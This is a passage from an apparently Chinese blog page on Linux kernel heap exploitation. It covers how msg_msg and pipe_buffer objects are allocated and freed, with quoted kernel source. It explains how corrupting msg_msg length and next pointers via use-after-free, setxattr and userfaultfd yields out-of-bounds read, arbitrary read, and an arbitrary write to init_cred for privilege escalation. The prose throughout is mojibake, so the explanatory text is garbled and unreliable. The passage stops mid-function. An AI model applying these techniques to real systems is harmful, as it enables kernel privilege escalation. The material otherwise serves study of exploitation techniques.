class="function"></span>&#123;</span><br><span class="line">	<span class="comment">//æ­£å¸¸çš„ä¸€äº›æ•°æ®å¤åˆ¶</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line"><span class="comment">//å¦‚æœæ²¡æœ‰è®¾ç½®CONFIG_CHECKPOINT_RESTORE=yåˆ™ä¼šå‡ºé”™</span></span><br><span class="line"><span class="function">struct msg_msg *<span class="title">copy_msg</span><span class="params">(struct msg_msg *src, struct msg_msg *dst)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> ERR_PTR(-ENOSYS);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></div></figure>

<p>ğŸ”ºæ³¨ï¼šè¿˜æœ‰ä¸€ç‚¹ä¸çŸ¥é“æ˜¯ä¸æ˜¯ä»€ä¹ˆbugï¼Œåœ¨æŸäº›å†…æ ¸ç‰ˆæœ¬ä¸­ï¼Œè‡³å°‘æˆ‘çš„<code>v5.11</code>ä¸­ï¼Œ<code>MSG_NOERROR</code>å’Œ<code>MSG_COPY</code>ï¼ˆåç»­ä¼šè®²åˆ°ï¼‰æ²¡æœ‰åŠæ³•åŒæ—¶ç”Ÿæ•ˆï¼Œå…³é”®ç‚¹åœ¨äº<code>copy_msg()</code>å‡½æ•°ä¸­ï¼Œè½¬åŒ–æˆæ±‡ç¼–å¦‚ä¸‹ï¼š</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220512163536660.png" alt="image-20220512163536660"></p>
<p>æ³¨æ„åˆ°çº¢æ¡†çš„éƒ¨åˆ†ï¼Œè·å–<code>rdi(msg)</code>å’Œ<code>rsi(copy)</code>å¯¹åº”çš„<code>m_ts</code>è¿›è¡Œæ¯”è¾ƒï¼Œè€Œ<code>copy</code>çš„<code>m_ts</code>æ˜¯ä»ç”¨æˆ·ä¼ è¿›æ¥çš„æƒ³è¦è·å–æ¶ˆæ¯çš„é•¿åº¦ï¼Œå¦‚æœå°äºå®é™…çš„<code>msg</code>çš„<code>m_ts</code>é•¿åº¦ï¼Œé‚£å°±æ ‡è®°é”™è¯¯ç„¶åé€€å‡ºã€‚å¯ä»¥è¿™ä¸ªæ¯”è¾ƒåº”è¯¥æ˜¯åœ¨åé¢æ‰ä¼šè¿›è¡Œçš„ï¼Œä½†æ˜¯è¿™é‡Œä¹Ÿçªç„¶å†’å‡ºæ¥ï¼Œå°±å¾ˆå¥‡æ€ªï¼Œå¯¼è‡´è¿™ä¸¤ä¸ªæ ‡å¿—ä½æ²¡åŠæ³•åŒæ—¶å‘æŒ¥ä½œç”¨ã€‚</p>

        <h5 id="B-é‡Šæ”¾å †å—çš„æ¶ˆæ¯è¯»å–"   >
          <a href="#B-é‡Šæ”¾å †å—çš„æ¶ˆæ¯è¯»å–" class="heading-link"><i class="fas fa-link"></i></a><a href="#B-é‡Šæ”¾å †å—çš„æ¶ˆæ¯è¯»å–" class="headerlink" title="B.é‡Šæ”¾å †å—çš„æ¶ˆæ¯è¯»å–"></a>B.é‡Šæ”¾å †å—çš„æ¶ˆæ¯è¯»å–</h5>
      <p>åŒç†å¦‚æœä¸æŒ‡å®š<code>MSG_COPY</code>è¿™ä¸ªæ ‡å¿—æ—¶ï¼Œä»æ¶ˆæ¯é˜Ÿåˆ—ä¸­è¯»å–æ¶ˆæ¯å°±ä¼šè§¦å‘å†…å­˜é‡Šæ”¾ï¼Œè¿™é‡Œå°±å¯ä»¥ä¾æ®å‘é€æ¶ˆæ¯æ—¶è®¾ç½®çš„<code>mtype</code>å’Œæ¥æ”¶æ¶ˆæ¯æ—¶è®¾ç½®çš„<code>msgtpy</code>æ¥è¿›è¡Œæ¶ˆæ¯é˜Ÿåˆ—ä¸­å„ä¸ªä½ç½®çš„å †å—çš„é‡Šæ”¾ã€‚</p>

        <h5 id="C-æ•°æ®å¤åˆ¶"   >
          <a href="#C-æ•°æ®å¤åˆ¶" class="heading-link"><i class="fas fa-link"></i></a><a href="#C-æ•°æ®å¤åˆ¶" class="headerlink" title="C.æ•°æ®å¤åˆ¶"></a>C.æ•°æ®å¤åˆ¶</h5>
      <p>ä¸ç®¡ä»€ä¹ˆæ ‡å¿—ä½ï¼Œåªè¦ä¸æ˜¯<code>MSG_NOERROR</code>å’Œ<code>MSG_COPY</code>è”åˆèµ·æ¥ï¼Œå¹¶ä¸”ç”³è¯·è¯»å–æ¶ˆæ¯é•¿åº¦<code>size</code>å°äºé€šè¿‡<code>find_msg()</code>å‡½æ•°è·å–åˆ°çš„å®é™…æ¶ˆæ¯çš„<code>m_ts</code>ï¼Œé‚£ä¹ˆæœ€ç»ˆéƒ½ä¼šèµ°åˆ°do_msgrcv()å‡½æ•°çš„æœ«å°¾ï¼Œé€šè¿‡å¦‚ä¸‹ä»£ç è¿›è¡Œæ•°æ®å¤åˆ¶å’Œå †å—é‡Šæ”¾</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bufsz = msg_handler(buf, msg, bufsz);</span><br><span class="line">free_msg(msg);</span><br></pre></td></tr></table></div></figure>


        <h3 id="3-åˆ©ç”¨"   >
          <a href="#3-åˆ©ç”¨" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-åˆ©ç”¨" class="headerlink" title="(3)åˆ©ç”¨"></a>(3)åˆ©ç”¨</h3>
      
        <h4 id="è¶Šç•Œè¯»å–"   >
          <a href="#è¶Šç•Œè¯»å–" class="heading-link"><i class="fas fa-link"></i></a><a href="#è¶Šç•Œè¯»å–" class="headerlink" title="è¶Šç•Œè¯»å–"></a>è¶Šç•Œè¯»å–</h4>
      <p>è¿™æ ·ï¼Œå½“æˆ‘ä»¬é€šè¿‡ä¹‹å‰æåˆ°çš„<code>double-free/UAF</code>ï¼Œå¹¶ä¸”å†ä½¿ç”¨<code>setxattr</code>æ¥å¯¹<code>msg_msgmsg</code>ä¸­çš„<code>m_ts</code>è¿›è¡Œä¿®æ”¹ï¼Œè¿™æ ·åœ¨æˆ‘ä»¬è°ƒç”¨<code>msgrcv</code>çš„æ—¶å€™å°±èƒ½è¶Šç•Œä»å †ä¸Šè¯»å–å†…å­˜äº†ï¼Œå°±å¯èƒ½èƒ½å¤Ÿæ³„éœ²åˆ°å †åœ°å€æˆ–è€…ç¨‹åºåŸºåœ°å€ã€‚</p>
<p><strong>ä½¿ç”¨<code>setxattr</code>çš„æ—¶å€™éœ€è¦æ³¨æ„é‡Šæ”¾å †å—æ—¶FDçš„ä½ç½®ï¼Œä¸åŒå†…æ ¸ç‰ˆæœ¬å¼€å¯ä¸åŒä¿æŠ¤ä¸‹FDçš„ä½ç½®ä¸å¤ªä¸€æ ·</strong></p>
<p>ä¸ºäº†è·å–åˆ°åœ°å€çš„æˆåŠŸæ€§æ›´å¤§ï¼Œæˆ‘ä»¬å°±éœ€è¦ç”¨åˆ°å•ä¸ª<code>msg_queue</code>å’Œå•ä¸ª<code>msg_msg</code>çš„å†…å­˜æ¨¡å‹</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220511113542467.png" alt="image-20220511113542467"></p>
<p>å¯ä»¥çœ‹åˆ°å•ä¸ª<code>msg_msg</code>åœ¨<code>msg_queue</code>çš„ç®¡ç†ä¸‹å½¢æˆåŒå‘å¾ªç¯é“¾è¡¨ï¼Œæ‰€ä»¥å¦‚æœæˆ‘ä»¬é€šè¿‡<code>msgget</code>å’Œ<code>msgsnd</code>å¤šç”³è¯·ä¸€äº›ç›¸åŒå¤§å°çš„ä¸”åªæœ‰ä¸€ä¸ª<code>msg_msg</code>ç»“æ„ä½“çš„<code>msg_queue</code>ï¼Œé‚£ä¹ˆè¶Šç•Œè¯»å–çš„æ—¶å€™ï¼Œå°±å¯ä»¥è¯»å–åˆ°åªæœ‰å•ä¸ª<code>msg_msg</code>çš„å¤´éƒ¨äº†</p>
<p>è€Œå•ä¸ª<code>msg_msg</code>ç”±äºåŒå‘å¾ªç¯é“¾è¡¨ï¼Œå…¶å¤´éƒ¨ä¸­åˆå­˜åœ¨æŒ‡å‘<code>msg_queue</code>çš„æŒ‡é’ˆï¼Œé‚£ä¹ˆè¿™æ ·å°±èƒ½æ³„éœ²å‡º<code>msg_queue</code>çš„å †åœ°å€äº†ã€‚</p>

        <h4 id="ä»»æ„è¯»å–"   >
          <a href="#ä»»æ„è¯»å–" class="heading-link"><i class="fas fa-link"></i></a><a href="#ä»»æ„è¯»å–" class="headerlink" title="ä»»æ„è¯»å–"></a>ä»»æ„è¯»å–</h4>
      <p>å®Œæˆä¸Šè¿°æ³„éœ²<code>msg_queue</code>çš„å †åœ°å€ä¹‹åï¼Œå°±éœ€è¦ç”¨åˆ°<code>msg_msg</code>çš„å†…å­˜å¸ƒå±€äº†</p>
<p>ç”±äºæˆ‘ä»¬çš„<code>msg_msg</code>æ¶ˆæ¯çš„å†…å­˜å¸ƒå±€å¦‚ä¸‹</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203122041731.png" alt="5IcVxRaFQtg3HCW"></p>
<p>ç›¸å…³è¯»å–æºç å¦‚ä¸‹ï¼š</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v4.9----ipc/msgutil.c</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DATALEN_MSG	((size_t)PAGE_SIZE-sizeof(struct msg_msg))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DATALEN_SEG	((size_t)PAGE_SIZE-sizeof(struct msg_msgseg))</span></span><br><span class="line">----------------------------------------------------------------</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">store_msg</span><span class="params">(<span class="keyword">void</span> __user *dest, struct msg_msg *msg, <span class="keyword">size_t</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">size_t</span> alen;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span> *<span class="title">seg</span>;</span></span><br><span class="line"></span><br><span class="line">	alen = min(len, DATALEN_MSG);</span><br><span class="line">	<span class="keyword">if</span> (copy_to_user(dest, msg + <span class="number">1</span>, alen))</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (seg = msg-&gt;next; seg != <span class="literal">NULL</span>; seg = seg-&gt;next) &#123;</span><br><span class="line">		len -= alen;</span><br><span class="line">		dest = (<span class="keyword">char</span> __user *)dest + alen;</span><br><span class="line">		alen = min(len, DATALEN_SEG);</span><br><span class="line">		<span class="keyword">if</span> (copy_to_user(dest, seg + <span class="number">1</span>, alen))</span><br><span class="line">			<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>æ‰€ä»¥å¦‚æœæˆ‘ä»¬å¯ä»¥ä¿®æ”¹<code>next</code>æŒ‡é’ˆå’Œ<code>m_ts</code>ï¼Œç»“åˆè¯»å–<code>msg</code>æœ€ç»ˆè°ƒç”¨å‡½æ•°<code>store_msg</code>çš„æºç ï¼Œé‚£ä¹ˆå°±èƒ½å¤Ÿå®ç°ä»»æ„è¯»å–ã€‚</p>
<p>é‚£ä¹ˆæ¥ç€ä¸Šé¢çš„ï¼Œæˆ‘ä»¬å¾—åˆ°<code>msg_queue</code>ä¹‹åï¼Œå¯ä»¥å†å°†<code>msg_msg</code>çš„nextæŒ‡é’ˆæŒ‡å›<code>msg_queue</code>ï¼Œè¯»å‡ºå…¶ä¸­çš„<code>msg_msg</code>ï¼Œå°±èƒ½è·å¾—å½“å‰å¯æ§å †å—çš„å †åœ°å€ã€‚</p>
<p>è¿™æ ·å®Œæˆä¹‹åï¼Œæˆ‘ä»¬ç»“åˆ<code>userfaultfd</code>å’Œ<code>setxattr</code>é¢‘ç¹ä¿®æ”¹nextæŒ‡é’ˆå°±èƒ½åŸºäºå½“å‰å †åœ°å€æ¥è¿›è¡Œå†…å­˜æœç´¢äº†ï¼Œä»è€Œèƒ½å¤Ÿå®Œæˆåœ°å€æ³„éœ²ã€‚</p>
<p>åŒæ—¶éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œåˆ¤æ–­é“¾è¡¨æ˜¯å¦ç»“æŸçš„ä¾æ®ä¸ºnextæ˜¯å¦ä¸ºnullï¼Œæ‰€ä»¥æˆ‘ä»¬ä»»æ„è¯»å–çš„æ—¶å€™ï¼Œæœ€å¥½æ‰¾åˆ°ä¸€ä¸ªåœ°æ–¹çš„nextæŒ‡é’ˆå¤„çš„å€¼ä¸ºnullã€‚</p>

        <h4 id="ä»»æ„å†™"   >
          <a href="#ä»»æ„å†™" class="heading-link"><i class="fas fa-link"></i></a><a href="#ä»»æ„å†™" class="headerlink" title="ä»»æ„å†™"></a>ä»»æ„å†™</h4>
      <p>åŒæ ·çš„ï¼Œ<code>msg_msg</code>ç”±äºnextæŒ‡é’ˆçš„å­˜åœ¨ï¼Œç»“åˆ<code>msgsnd</code>ä¹Ÿå…·å¤‡ä»»æ„åœ°å€å†™çš„åŠŸèƒ½ã€‚æˆ‘ä»¬å¯ä»¥åœ¨æ‹·è´çš„æ—¶å€™åˆ©ç”¨<code>userfaultfd</code>åœä¸‹æ¥ï¼Œç„¶åæ›´æ”¹nextæŒ‡é’ˆï¼Œä½¿å…¶æŒ‡å‘æˆ‘ä»¬éœ€è¦çš„åœ°æ–¹ï¼Œæ¯”å¦‚<code>init_cred</code>ç»“æ„ä½“ä½ç½®ï¼Œä»è€Œç›´æ¥ä¿®æ”¹è¿›è¡Œææƒã€‚</p>

        <h2 id="2-pipeç®¡é“â€”kmalloc-1024-kmalloc-192"   >
          <a href="#2-pipeç®¡é“â€”kmalloc-1024-kmalloc-192" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-pipeç®¡é“â€”kmalloc-1024-kmalloc-192" class="headerlink" title="2.pipeç®¡é“â€”kmalloc-1024/kmalloc-192"></a>2.pipeç®¡é“â€”kmalloc-1024/kmalloc-192</h2>
      <p>å‚ç…§ï¼š<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://blog.csdn.net/Rong_Toa/article/details/116270704" >(31æ¡æ¶ˆæ¯) Linuxç³»ç»Ÿè°ƒç”¨ï¼špipe()ç³»ç»Ÿè°ƒç”¨æºç åˆ†æ_rtoaxçš„åšå®¢-CSDNåšå®¢_linux pipe æºç </a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>****</p>
<p>é€šå¸¸æ¥è®²ï¼Œç®¡é“ç”¨æ¥åœ¨çˆ¶è¿›ç¨‹å’Œå­è¿›ç¨‹ä¹‹é—´é€šä¿¡ï¼Œå› ä¸º<code>fork</code>å‡ºæ¥çš„å­è¿›ç¨‹ä¼šç»§æ‰¿çˆ¶è¿›ç¨‹çš„æ–‡ä»¶æè¿°ç¬¦å‰¯æœ¬ã€‚è¿™é‡Œå°±ä½¿ç”¨å½“å‰è¿›ç¨‹æ¥åˆ›å»ºç®¡é“ç¬¦ï¼Œä»ç®¡é“çš„è¯»å–ç«¯(<code>pipe_fd[0]</code>)å’Œå†™å…¥ç«¯(<code>pipe_fd[1]</code>)æ¥è¿›è¡Œåˆ©ç”¨ã€‚</p>

        <h3 id="1-ä½¿ç”¨æ–¹æ³•-1"   >
          <a href="#1-ä½¿ç”¨æ–¹æ³•-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-ä½¿ç”¨æ–¹æ³•-1" class="headerlink" title="(1)ä½¿ç”¨æ–¹æ³•"></a>(1)ä½¿ç”¨æ–¹æ³•</h3>
      
        <h4 id="â‘ åˆ›å»º-2"   >
          <a href="#â‘ åˆ›å»º-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#â‘ åˆ›å»º-2" class="headerlink" title="â‘ åˆ›å»º"></a>â‘ åˆ›å»º</h4>
      <figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//ä½¿ç”¨pipeæˆ–è€…pipe2</span></span><br><span class="line"><span class="keyword">int</span> pipe_fd[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">pipe(pipe_fd);<span class="comment">//é»˜è®¤é˜»å¡çŠ¶æ€</span></span><br><span class="line"><span class="comment">//pipe2(pipe_fd,flag);</span></span><br></pre></td></tr></table></div></figure>

<p>å…¶ä¸­<code>pipe2</code>å‡½æ•°æˆ–è€…ç³»ç»Ÿè°ƒç”¨<code>__NR_pipe2</code>çš„<code>flag</code>æ”¯æŒé™¤0ä¹‹å¤–çš„ä¸‰ç§æ¨¡å¼ï¼Œå¯ç”¨åœ¨<code>man</code>æ‰‹å†Œä¸­æŸ¥çœ‹ã€‚</p>
<p>å¦‚æœä¼ å…¥çš„<code>flag</code>ä¸º0ï¼Œåˆ™å’Œ<code>pipe</code>å‡½æ•°æ˜¯ä¸€æ ·çš„ï¼Œæ˜¯é˜»å¡çš„ã€‚</p>
<p>é˜»å¡çŠ¶æ€ï¼šå³å½“æ²¡æœ‰æ•°æ®åœ¨ç®¡é“ä¸­æ—¶ï¼Œå¦‚æœè¿˜è°ƒç”¨<code>read</code>ä»ç®¡é“è¯»å–æ•°æ®ï¼Œé‚£ä¹ˆå°±ä¼šä½¿å¾—ç¨‹åºå¤„äºé˜»å¡çŠ¶æ€ï¼Œå…¶ä»–çš„ä¹Ÿæ˜¯ç±»ä¼¼çš„æƒ…å†µã€‚</p>
<p>ä¼šé»˜è®¤åˆ›å»ºä¸¤ä¸ªfdæ–‡ä»¶æè¿°ç¬¦çš„ï¼Œè¯¥fdæ–‡ä»¶æè¿°ç¬¦æ•ˆæœçš„ç›¸å…³ç»“æ„å¦‚ä¸‹</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.9  /fs/pipe.c</span></span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> <span class="title">pipefifo_fops</span> =</span> &#123;</span><br><span class="line">	.open		= fifo_open,</span><br><span class="line">	.llseek		= no_llseek,</span><br><span class="line">	.read_iter	= pipe_read,</span><br><span class="line">	.write_iter	= pipe_write,</span><br><span class="line">	.poll		= pipe_poll,</span><br><span class="line">	.unlocked_ioctl	= pipe_ioctl,</span><br><span class="line">	.release	= pipe_release,</span><br><span class="line">	.fasync		= pipe_fasync,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></div></figure>

<p>æ”¾å…¥åˆ°<code>pipe_fd</code>ä¸­ï¼Œå¦‚ä¸‹</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> pipe_fd[<span class="number">2</span>];</span><br><span class="line">pipe(pipe_fd);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;pipe_fd[0]:%d\n&quot;</span>,pipe_fd[<span class="number">0</span>]);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;pipe_fd[1]:%d\n&quot;</span>,pipe_fd[<span class="number">1</span>]);</span><br></pre></td></tr></table></div></figure>

<p>æ•ˆæœå¦‚ä¸‹ï¼š</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220509161948796.png" alt="image-20220509161948796"></p>
<p>ä¹‹åä½¿ç”¨<code>write/read</code>æ¥å†™å…¥è¯»å–å³å¯ï¼Œæ³¨æ„å†™å…¥ç«¯ä¸º<code>fd[1]</code>ï¼Œè¯»å–ç«¯ä¸º<code>fd[0]</code></p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> buf[<span class="number">0x8</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">char</span>* msg = <span class="string">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;</span>;</span><br><span class="line">write(pipe_fd[<span class="number">1</span>],msg,<span class="number">0x8</span>);</span><br><span class="line">read(pipe_fd[<span class="number">0</span>],buf,<span class="number">0x8</span>);</span><br></pre></td></tr></table></div></figure>




        <h4 id="â‘¡é‡Šæ”¾-1"   >
          <a href="#â‘¡é‡Šæ”¾-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#â‘¡é‡Šæ”¾-1" class="headerlink" title="â‘¡é‡Šæ”¾"></a>â‘¡é‡Šæ”¾</h4>
      <p>ç”±äº<code>pipe</code>ç®¡é“åˆ›å»ºåä¼šå¯¹åº”åˆ›å»ºæ–‡ä»¶æè¿°ç¬¦ï¼Œæ‰€ä»¥é‡Šæ”¾ä¸¤ç«¯å¯¹åº”çš„æ–‡ä»¶æè¿°ç¬¦å³å¯é‡Šæ”¾ç®¡é“<code>pipe</code>ç®¡é“</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">close(pipe_fd[<span class="number">0</span>]);</span><br><span class="line">close(pipe_fd[<span class="number">1</span>]);</span><br></pre></td></tr></table></div></figure>

<p>éœ€è¦å°†ä¸¤ä¸ªæ–‡ä»¶æè¿°ç¬¦fdéƒ½ç»™é‡Šæ”¾æ‰æˆ–è€…ä½¿ç”¨<code>read</code>å°†ç®¡é“ä¸­æ‰€æœ‰æ•°æ®éƒ½è¯»å–å‡ºæ¥ï¼Œæ‰ä¼šè¿›å…¥<code>free_pipe_info</code>å‡½æ•°æ¥é‡Šæ”¾åœ¨çº¿æ€§æ˜ å°„åŒºåŸŸç”³è¯·çš„ç›¸å…³å†…å­˜èµ„æºï¼Œå¦åˆ™è¿˜æ˜¯ä¸ä¼šè¿›å…¥çš„ã€‚</p>

        <h3 id="2-å†…å­˜åˆ†é…ä¸é‡Šæ”¾-1"   >
          <a href="#2-å†…å­˜åˆ†é…ä¸é‡Šæ”¾-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-å†…å­˜åˆ†é…ä¸é‡Šæ”¾-1" class="headerlink" title="(2)å†…å­˜åˆ†é…ä¸é‡Šæ”¾"></a>(2)å†…å­˜åˆ†é…ä¸é‡Šæ”¾</h3>
      
        <h4 id="â‘ åˆ†é…"   >
          <a href="#â‘ åˆ†é…" class="heading-link"><i class="fas fa-link"></i></a><a href="#â‘ åˆ†é…" class="headerlink" title="â‘ åˆ†é…"></a>â‘ åˆ†é…</h4>
      <p>å‘ç”Ÿåœ¨è°ƒç”¨<code>pipe</code>/<code>pipe2</code>å‡½æ•°ï¼Œæˆ–è€…ç³»ç»Ÿè°ƒç”¨<code>__NR_pipe</code>/<code>__NR_pipe2</code>æ—¶ï¼Œå†…æ ¸å…¥å£ä¸º</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">SYSCALL_DEFINE2(pipe2, <span class="keyword">int</span> __user *, fildes, <span class="keyword">int</span>, flags)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">return</span> do_pipe2(fildes, flags);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">SYSCALL_DEFINE1(pipe, <span class="keyword">int</span> __user *, fildes) <span class="comment">/* pipe() ç³»ç»Ÿè°ƒç”¨ */</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">return</span> do_pipe2(fildes, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>å‡½æ•°è°ƒç”¨é“¾ï¼š</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">do_pipe2()-&gt;__do_pipe_flags()-&gt;create_pipe_files()-&gt;get_pipe_inode()-&gt;alloc_pipe_info()</span><br></pre></td></tr></table></div></figure>

<p>è°ƒç”¨ä¹‹åä¼šåœ¨å†…æ ¸çš„çº¿æ€§æ˜ å°„åŒºåŸŸè¿›è¡Œå†…å­˜åˆ†é…ï¼Œä¹Ÿå°±æ˜¯å¸¸è§çš„å†…æ ¸å †ç®¡ç†çš„åŒºåŸŸã€‚åˆ†é…ç‚¹åœ¨å¦‚ä¸‹å‡½æ•°ä¸­ï¼š</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.9 /fs/pipe.c</span></span><br><span class="line"><span class="function">struct pipe_inode_info *<span class="title">alloc_pipe_info</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">pipe_inode_info</span> *<span class="title">pipe</span>;</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> pipe_bufs = PIPE_DEF_BUFFERS;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//#define PIPE_DEF_BUFFERS	16</span></span><br><span class="line">    <span class="comment">//.....</span></span><br><span class="line">    <span class="comment">//pipe_inode_infoç®¡ç†ç»“æ„ï¼Œå¤§å°ä¸º0xa0ï¼Œå±äºkmalloc-192</span></span><br><span class="line">	pipe = kzalloc(<span class="keyword">sizeof</span>(struct pipe_inode_info), GFP_KERNEL_ACCOUNT);</span><br><span class="line">	<span class="keyword">if</span> (pipe == <span class="literal">NULL</span>)</span><br><span class="line">		<span class="keyword">goto</span> out_free_uid;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//.....</span></span><br><span class="line">    <span class="comment">//ç›¸å…³çš„æ¶ˆæ¯ç»“æ„ä¸ºpipe_bufferæ•°ç»„,æ€»å…±16*0x28=0x280,ç›´æ¥ä»kmalloc-1024ä¸­æ‹¿å–å †å—</span></span><br><span class="line">	pipe-&gt;bufs = kcalloc(pipe_bufs, <span class="keyword">sizeof</span>(struct pipe_buffer),</span><br><span class="line">			     GFP_KERNEL_ACCOUNT);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//.....</span></span><br><span class="line">	<span class="comment">//å¯¹ç”³è¯·çš„pipeç®¡é“è¿›è¡Œä¸€äº›åˆå§‹åŒ–</span></span><br><span class="line">	<span class="keyword">if</span> (pipe-&gt;bufs) &#123;</span><br><span class="line">		init_waitqueue_head(&amp;pipe-&gt;rd_wait);</span><br><span class="line">		init_waitqueue_head(&amp;pipe-&gt;wr_wait);</span><br><span class="line">		pipe-&gt;r_counter = pipe-&gt;w_counter = <span class="number">1</span>;</span><br><span class="line">		pipe-&gt;max_usage = pipe_bufs;</span><br><span class="line">		pipe-&gt;ring_size = pipe_bufs;</span><br><span class="line">		pipe-&gt;nr_accounted = pipe_bufs;</span><br><span class="line">		pipe-&gt;user = user;</span><br><span class="line">		mutex_init(&amp;pipe-&gt;mutex);</span><br><span class="line">		<span class="keyword">return</span> pipe;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//.....</span></span><br><span class="line">    <span class="comment">//å‡ºé”™çš„è¯åˆ™ä¼šé‡Šæ”¾æ‰ï¼Œå…·ä½“å¹²å•¥çš„ä¸å¤ªæ¸…æ¥š</span></span><br><span class="line">out_free_uid:</span><br><span class="line">	